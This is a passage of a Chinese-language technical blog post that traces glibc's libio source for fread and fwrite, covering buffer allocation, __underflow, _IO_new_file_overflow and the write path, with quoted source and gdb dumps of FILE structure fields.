class="line">_IO_file_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t size;</span><br><span class="line">  char *p;</span><br><span class="line">  struct stat64 st;</span><br><span class="line"></span><br><span class="line">  size = BUFSIZ;</span><br><span class="line">  if (fp-&gt;_fileno &gt;= 0 &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), 0) &gt;= 0)</span><br><span class="line">    &#123;</span><br><span class="line">      if (S_ISCHR (st.st_mode))</span><br><span class="line">&#123;</span><br><span class="line">  /* Possibly a tty.  */</span><br><span class="line">  if (</span><br><span class="line">#ifdef DEV_TTY_P</span><br><span class="line">      DEV_TTY_P (&amp;st) ||</span><br><span class="line">#endif</span><br><span class="line">      local_isatty (fp-&gt;_fileno))</span><br><span class="line">    fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">&#125;</span><br><span class="line">#if defined _STATBUF_ST_BLKSIZE</span><br><span class="line">      if (st.st_blksize &gt; 0 &amp;&amp; st.st_blksize &lt; BUFSIZ)</span><br><span class="line">size = st.st_blksize;</span><br><span class="line">#endif</span><br><span class="line">    &#125;</span><br><span class="line">  p = malloc (size);</span><br><span class="line">  if (__glibc_unlikely (p == NULL))</span><br><span class="line">    return EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, 1);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_doallocate)</span><br></pre></td></tr></table></figure></p><p>首先调用_IO_SYSSTAT去获取文件信息，_IO_SYSSTAT函数是vtable中的 __stat函数，获取文件信息，这里是通过_fxstat64来获取，其内部是通过系统调用来实现，之后对size进行设置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_file_stat (_IO_FILE *fp, void *st)</span><br><span class="line">&#123; </span><br><span class="line">    return __fxstat64 (_STAT_VER, fp-&gt;_fileno, (struct stat64 *) st);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_stat)</span><br></pre></td></tr></table></figure></p><p>再之后通过malloc得到分配的缓冲区，再调用<code>_IO_setb</code>设置FILE缓冲区<br>跟进_IO_setb,设置了_IO_buf_base和_IO_buf_end，还有_flags<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_setb (FILE *f, char *b, char *eb, int a)</span><br><span class="line">&#123;</span><br><span class="line">  if (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    free (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  if (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  else</span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setb)</span><br></pre></td></tr></table></figure></p><p>之后逐步返回到_IO_file_xsgetn</p><p>可以看到_IO_buf_base与_IO_buf_end都被设置了，大小为0x1000<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_buf_base = 0x602240 &quot;&quot;, </span><br><span class="line">_IO_buf_end = 0x603240 &quot;&quot;,</span><br></pre></td></tr></table></figure></p><h5 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">while (want &gt; 0)    </span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      if (want &lt;= have)                                  //如果缓冲区里有足够的字符，就直接将缓冲区里的字符复制到目标区</span><br><span class="line">&#123;</span><br><span class="line">  memcpy (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">  want = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   else</span><br><span class="line">&#123;</span><br><span class="line">  if (have &gt; 0)                                       //如果缓冲区字符不够，就将其先复制到目标区</span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="第四步：-underflow"><a href="#第四步：-underflow" class="headerlink" title="第四步：__underflow"></a>第四步：__underflow</h5><p>因为是第一次读取数据，此时的fp-&gt;_IO_read_end以及fp-&gt;_IO_read_ptr都是0，因此会进入到__underflow<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* If we now want less than a buffer, underflow and repeat</span><br><span class="line">     the copy.  Otherwise, _IO_SYSREAD directly to</span><br><span class="line">     the user buffer. */</span><br><span class="line">  if (fp-&gt;_IO_buf_base</span><br><span class="line">      &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))       //输入缓冲区不能满足需求，调用__underflow读入数据</span><br><span class="line">    &#123;</span><br><span class="line">      if (__underflow (fp) == EOF)</span><br><span class="line">break;</span><br><span class="line"></span><br><span class="line">      continue;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>进入__underflow函数，位于/libio/genops.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">__underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  if (_IO_vtable_offset (fp) == 0 &amp;&amp; _IO_fwide (fp, -1) != -1)</span><br><span class="line">    return EOF;</span><br><span class="line"></span><br><span class="line">  if (fp-&gt;_mode == 0)</span><br><span class="line">    _IO_fwide (fp, -1);</span><br><span class="line">  if (_IO_in_put_mode (fp))</span><br><span class="line">    if (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      return EOF;</span><br><span class="line">  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    return *(unsigned char *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  if (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">return *(unsigned char *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  if (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      if (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line">return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  else if (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  return _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__underflow)</span><br></pre></td></tr></table></figure></p><p>可以看到经过一些检查之后会调用_IO_UNDERFLOW,跟进，调用了/libio/fileops.c中的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br></pre></td></tr></table></figure></p><p>检查FILE结构体的_flag标志位是否包含_IO_NO_READS，如果存在这个标志位则直接返回EOF，其中_IO_NO_READS标志位的定义是#define _IO_NO_READS 4 /<em> Reading not allowed </em>/。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>如果fp-&gt;_IO_buf_base为null，则调用_IO_doallocbuf分配输入缓冲区。和前面一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    return *(unsigned char *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  if (fp-&gt;_IO_buf_base == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Maybe we already have a push back pointer.  */</span><br><span class="line">      if (fp-&gt;_IO_save_base != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  free (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>接着初始化设置FILE结构体指针，将他们都设置成fp-&gt;_IO_buf_base<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">  = fp-&gt;_IO_buf_base;</span><br></pre></td></tr></table></figure></p><p>调用_IO_SYSREAD（vtable中的_IO_file_read函数），该函数最终执行系统调用read，读取文件数据，<br>数据读入到fp-&gt;_IO_buf_base中，读入大小为输入缓冲区的大小fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br></pre></td></tr></table></figure></p><p>设置输入缓冲区已有数据的size，即设置fp-&gt;_IO_read_end为fp-&gt;_IO_read_end += count。<br>设置完之后通过while循环进入第二部分将输入缓冲区拷贝至目标缓冲区，流程结束，返回。</p><ul><li>ray-cp大佬解释了下为什么最后在_IO_UNDERFLOW中又一次检查调用了_IO_doallocbuf分配输入缓冲区。因为虽然一般的输入底层都在调用__underflow函数，但是并非全部,scanf函数调用的是_u_flow函数，其内部并未提前分配缓冲区，之后也调用了_IO_UNDERFLOW函数，因此需要在这里进行缓冲区的分配。</li></ul><h1 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h1><h2 id="框架-2"><a href="#框架-2" class="headerlink" title="框架"></a>框架</h2><p>主体是_IO_new_file_xsputn函数，该函数调用_IO_new_file_overflow建立刷新缓冲区，<br>其中_IO_file_doallocate负责缓冲区的申请建立<br>最后调用_IO_default_xsputn将剩余输出至输出缓冲区</p><h2 id="细节-2"><a href="#细节-2" class="headerlink" title="细节"></a>细节</h2><h3 id="fwrite-gt-IO-fwrite"><a href="#fwrite-gt-IO-fwrite" class="headerlink" title="fwrite-&gt;_IO_fwrite"></a>fwrite-&gt;_IO_fwrite</h3><p>跟进，进入_IO_fwrite函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_fwrite (const void *buf, size_t size, size_t count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t request = size * count;</span><br><span class="line">  size_t written = 0;</span><br><span class="line">  CHECK_FILE (fp, 0);</span><br><span class="line">  if (request == 0)</span><br><span class="line">    return 0;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)</span><br><span class="line">    written = _IO_sputn (fp, (const char *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  /* We have written all of the input in case the return value indicates</span><br><span class="line">     this or EOF is returned.  The latter is a special case where we</span><br><span class="line">     simply did not manage to flush the buffer.  But the data is in the</span><br><span class="line">     buffer and therefore written as far as fwrite is concerned.  */</span><br><span class="line">  if (written == request || written == EOF)</span><br><span class="line">    return count;</span><br><span class="line">  else</span><br><span class="line">    return written / size;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fwrite)</span><br></pre></td></tr></table></figure><h3 id="IO-sputn-gt-IO-new-file-xsputn"><a href="#IO-sputn-gt-IO-new-file-xsputn" class="headerlink" title="_IO_sputn-&gt;_IO_new_file_xsputn"></a>_IO_sputn-&gt;_IO_new_file_xsputn</h3><p>可以看到前面的流程和fread相似，之后调用了主体函数_IO_sputn，跟进，进入了/libio/fileops.c中的_IO_new_file_xsputn<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_new_file_xsputn (FILE *f, const void *data, size_t n)</span><br><span class="line">...</span><br><span class="line">/* First figure out how much space is available in the buffer. */</span><br><span class="line">  if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      if (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  const char *p;</span><br><span class="line">  for (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      if (*--p == &apos;\n&apos;)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + 1;</span><br><span class="line">  must_flush = 1;</span><br><span class="line">  break;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; /* Space available. */</span><br></pre></td></tr></table></figure></p><p>这一段判断了缓冲区剩余的空间，存在了count中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/* Then fill the buffer. */</span><br><span class="line"> if (count &gt; 0)</span><br><span class="line">   &#123;</span><br><span class="line">     if (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line">     f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">     s += count;</span><br><span class="line">     to_do -= count;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>如果缓冲区还有剩余，则将数据拷贝至输出缓冲区。并计算是否还有目标输出剩余<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> if (to_do + must_flush &gt; 0)</span><br><span class="line">   &#123;</span><br><span class="line">     size_t block_size, do_write;</span><br><span class="line">     /* Next flush the (full) buffer. */</span><br><span class="line">     if (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">/* If nothing else has to be written we must not signal the</span><br><span class="line">   caller that everything has been written.  */</span><br><span class="line">return to_do == 0 ? EOF : n - to_do;</span><br></pre></td></tr></table></figure></p><h3 id="IO-OVERFLOW-gt-IO-new-file-overflow"><a href="#IO-OVERFLOW-gt-IO-new-file-overflow" class="headerlink" title="_IO_OVERFLOW-&gt;_IO_new_file_overflow"></a>_IO_OVERFLOW-&gt;_IO_new_file_overflow</h3><p>如果还有剩余，则说明缓冲区未建立或已经满了，需要使用_IO_OVERFLOW刷新缓冲区。跟进该函数，是位于fileops.c中的_IO_new_file_overflow<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, int ch)</span><br></pre></td></tr></table></figure></p><p>继续跟进，先检查是否有_IO_NO_WRITE标志位<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */</span><br><span class="line">  &#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno (EBADF);</span><br><span class="line">    return EOF;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>检查_IO_write_base是否为空或_IO_CURRENTLY_PUTTING标志位是否为0，若为空则分配输出缓冲区。（所以一般只要调用过stdout输出过该标志位就是1）<br>这里调用的是_IO_doallocbuf来分配，与fread中相同。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</span><br><span class="line">   &#123;</span><br><span class="line">     /* Allocate a buffer if needed. */</span><br><span class="line">     if (f-&gt;_IO_write_base == NULL)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟进_IO_setg，是一句宏，将与read相关的三个指针赋值为_IO_buf_base<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span><br><span class="line">(fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span><br></pre></td></tr></table></figure></p><p>可以看下修改结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_IO_read_ptr = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_read_end = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_read_base = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_write_base = 0x0, </span><br><span class="line">_IO_write_ptr = 0x0, </span><br><span class="line">_IO_write_end = 0x0, </span><br><span class="line">_IO_buf_base = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_buf_end = 0x604480 &quot;&quot;,</span><br></pre></td></tr></table></figure></p><p>再之后就是相关指针的设置，对读写相关的指针与flags等进行了赋值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_flags = -72536956,   --&gt; 0xfbad2c84</span><br><span class="line">_IO_read_ptr = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_read_end = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_read_base = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_write_base = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_write_ptr = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_write_end = 0x604480 &quot;&quot;, </span><br><span class="line">_IO_buf_base = 0x603480 &quot;&quot;, </span><br><span class="line">_IO_buf_end = 0x604480 &quot;&quot;,</span><br></pre></td></tr></table></figure></p><p>赋值之后就要开始调用_IO_do_write函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &apos;\n&apos;))</span><br><span class="line">    if (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      return EOF;</span><br></pre></td></tr></table></figure></p><h3 id="IO-do-write-gt-IO-new-do-write"><a href="#IO-do-write-gt-IO-new-do-write" class="headerlink" title="_IO_do_write-&gt;_IO_new_do_write"></a>_IO_do_write-&gt;_IO_new_do_write</h3><p>跟进调用了fileops.c中的_IO_new_do_write<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_new_do_write (FILE *fp, const char *data, size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  return (to_do == 0</span><br><span class="line">  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br></pre></td></tr></table></figure></p><h3 id="new-do-write"><a href="#new-do-write" class="headerlink" title="new_do_write"></a>new_do_write</h3><p>看到主要调用了new_do_write函数，位于该函数下方。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">static size_t</span><br><span class="line">new_do_write (FILE *fp, const char *data, size_t to_do)</span><br></pre></td></tr></table></figure></p><p>看到刚开始进行了标志位的判断，然后看read_end与write_base是否存在偏移，有则调用_IO_SYSSEEK校正指针位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> if (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">   /* On a system without a proper O_APPEND implementation,</span><br><span class="line">      you would need to sys_seek(0, SEEK_END) here, but is</span><br><span class="line">      not needed nor desirable for Unix- or Posix-like systems.</span><br><span class="line">      Instead, just indicate that offset (before and after) is</span><br><span class="line">      unpredictable. */</span><br><span class="line">   fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"> else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">   &#123;</span><br><span class="line">     off64_t new_pos</span><br><span class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);</span><br><span class="line">     if (new_pos == _IO_pos_BAD)</span><br><span class="line">return 0;</span><br><span class="line">     fp-&gt;_offset = new_pos;</span><br><span class="line">   &#125;</span><br><span class="line"> if (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">     fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;</span><br></pre></td></tr></table></figure></p><p>之后调用_IO_SYSWRITE输出输出缓冲区的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count = _IO_SYSWRITE (fp, data, to_do);</span><br></pre></td></tr></table></figure></p><h3 id="IO-SYSWRITE-gt-IO-new-file-write"><a href="#IO-SYSWRITE-gt-IO-new-file-write" class="headerlink" title="_IO_SYSWRITE-&gt;_IO_new_file_write"></a>_IO_SYSWRITE-&gt;_IO_new_file_write</h3><p>跟进_IO_SYSWRITE查看输出缓冲区的内容是怎样被输出的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ssize_t</span><br><span class="line">_IO_new_file_write (FILE *f, const void *data, ssize_t n)</span><br><span class="line">&#123;</span><br><span class="line">  ssize_t to_do = n;</span><br><span class="line">  while (to_do &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">      ssize_t count = (__builtin_expect (f-&gt;_flags2</span><br><span class="line">                                         &amp; _IO_FLAGS2_NOTCANCEL, 0)</span><br><span class="line">   ? __write_nocancel (f-&gt;_fileno, data, to_do)</span><br><span class="line">   : __write (f-&gt;_fileno, data, to_do));</span><br><span class="line">      if (count &lt; 0)</span><br><span class="line">&#123;</span><br><span class="line">  f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">  break;</span><br><span class="line">&#125;</span><br><span class="line">      to_do -= count;</span><br><span class="line">      data = (void *) ((char *) data + count);</span><br><span class="line">    &#125;</span><br><span class="line">  n -= to_do;</span><br><span class="line">  if (f-&gt;_offset &gt;= 0)</span><br><span class="line">    f-&gt;_offset += n;</span><br><span class="line">  return n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到执行了系统调用__write来将其输出。</p><p>返回之后调用_IO_setg刷新缓冲区指针并返回。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, 